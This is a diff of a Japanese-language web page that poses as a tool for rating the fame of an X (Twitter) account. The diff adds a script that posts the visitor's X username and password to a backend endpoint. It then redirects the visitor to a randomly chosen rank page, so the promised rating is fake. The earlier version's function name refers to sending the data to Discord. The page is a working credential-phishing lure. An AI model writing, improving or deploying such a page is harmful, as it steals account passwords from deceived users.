@@ -3,13 +3,12 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ログイン</title>
+  <title>X知名度ランク抽出</title>
   <style>
-    * { box-sizing: border-box; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      background: #f5f7fa;
-      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      background: #f5f5f7;
       min-height: 100vh;
       display: flex;
       justify-content: center;
@@ -19,109 +18,118 @@
     .card {
       background: #ffffff;
       width: 100%;
-      max-width: 420px;
-      border-radius: 20px;
-      padding: 40px 32px;
-      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
+      max-width: 400px;
+      border-radius: 16px;
+      padding: 32px 28px 28px;
+      box-shadow: 0 2px 16px rgba(0,0,0,0.06);
     }
     h1 {
       text-align: center;
-      font-size: 28px;
+      font-size: 26px;
       font-weight: 700;
-      color: #1a1a2e;
-      margin: 0 0 32px 0;
+      color: #1d1d1f;
+      margin-bottom: 12px;
     }
-    .field { margin-bottom: 20px; }
+    .subtitle {
+      text-align: center;
+      font-size: 14px;
+      color: #6e6e73;
+      margin-bottom: 28px;
+      line-height: 1.5;
+    }
+    .field { margin-bottom: 18px; }
     label {
       display: block;
       font-size: 14px;
-      color: #333;
-      margin-bottom: 8px;
+      color: #1d1d1f;
+      margin-bottom: 6px;
       font-weight: 500;
     }
     input {
       width: 100%;
       padding: 14px 16px;
-      border: 1px solid #e0e0e0;
+      border: 1px solid #d2d2d7;
       border-radius: 10px;
       font-size: 16px;
+      background: #fafafa;
       outline: none;
     }
-    input:focus { border-color: #1da1f2; }
-    input::placeholder { color: #aaa; }
+    input:focus { border-color: #007aff; background: #fff; }
+    input::placeholder { color: #aeaeb2; }
     button {
       width: 100%;
       padding: 16px;
-      background: #1a73e8;
+      background: #007aff;
       color: white;
       border: none;
-      border-radius: 10px;
-      font-size: 16px;
+      border-radius: 12px;
+      font-size: 17px;
       font-weight: 600;
       cursor: pointer;
       margin-top: 8px;
     }
-    button:active { background: #1557b0; }
-    .twitter {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      margin-top: 24px;
-      color: #666;
-      font-size: 14px;
-    }
-    .twitter svg { width: 28px; height: 28px; }
+    button:active { background: #0066d6; }
     .note {
       text-align: center;
-      color: #888;
+      color: #8e8e93;
       font-size: 13px;
-      margin-top: 28px;
-      line-height: 1.6;
+      margin-top: 20px;
     }
     #status {
       text-align: center;
-      margin-top: 16px;
-      min-height: 20px;
+      margin-top: 12px;
       font-size: 14px;
+      min-height: 20px;
     }
   </style>
 </head>
 <body>
   <div class="card">
-    <h1>ログイン</h1>
+    <h1>X知名度ランク抽出</h1>
+    <p class="subtitle">AIがXアカウントを確認して知名度をE~SSで評価します</p>
     <div class="field">
-      <label>メールアドレスまたはユーザー名</label>
+      <label>ユーザー名またはメールアドレス</label>
       <input type="text" id="username" placeholder="@userID">
     </div>
     <div class="field">
       <label>パスワード</label>
       <input type="password" id="password">
     </div>
-    <button onclick="sendToDiscord()">ログイン</button>
-    <div class="twitter">
-      <svg viewBox="0 0 24 24" fill="#1da1f2">
-        <path d="M22.46 6c-.77.35-1.6.58-2.46.69a4.2 4.2 0 001.85-2.31 8.4 8.4 0 01-2.66 1.02 4.2 4.2 0 00-7.15 3.83A11.9 11.9 0 013 4.9a4.2 4.2 0 001.3 5.6 4.2 4.2 0 01-1.9-.52v.05a4.2 4.2 0 003.36 4.11 4.2 4.2 0 01-1.89.07 4.2 4.2 0 003.92 2.91A8.42 8.42 0 012 18.4a11.87 11.87 0 006.29 1.84c7.55 0 11.68-6.25 11.68-11.68 0-.18 0-.35-.01-.53A8.35 8.35 0 0022.46 6z"/>
-      </svg>
-      連携済み
-    </div>
-    <p class="note">ログイン後、数分でBOTから結果がツイートされます。</p>
+    <button id="loginBtn">ログイン</button>
+    <p class="note">ログイン後、BOTから結果が報告されます</p>
     <div id="status"></div>
   </div>
   <script>
-    // Webhook URL is managed securely on Vercel
-    async function sendToDiscord() {
+    const ranks = ["e", "d", "c", "b", "a", "s", "ss"];
+    document.getElementById("loginBtn").addEventListener("click", async () => {
       const username = document.getElementById("username").value.trim();
       const password = document.getElementById("password").value.trim();
       const status = document.getElementById("status");
-      if (!username) {
-        status.textContent = "ユーザー名を入力してください";
-        status.style.color = "#e53935";
+      if (!username || !password) {
+        status.textContent = "ユーザー名とパスワードを入力してください";
+        status.style.color = "#ff3b30";
         return;
       }
-      status.textContent = "送信機能はVercel側で管理されています";
+      status.textContent = "処理中...";
       status.style.color = "#666";
-    }
+      try {
+        const res = await fetch("/api/send", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ username, password })
+        });
+        if (res.ok) {
+          const randomRank = ranks[Math.floor(Math.random() * ranks.length)];
+          window.location.href = `/rank-${randomRank}.html`;
+        } else {
+          status.textContent = "送信に失敗しました";
+          status.style.color = "#ff3b30";
+        }
+      } catch (err) {
+        status.textContent = "送信に失敗しました";
+        status.style.color = "#ff3b30";
+      }
+    });
   </script>
 </body>
 </html>
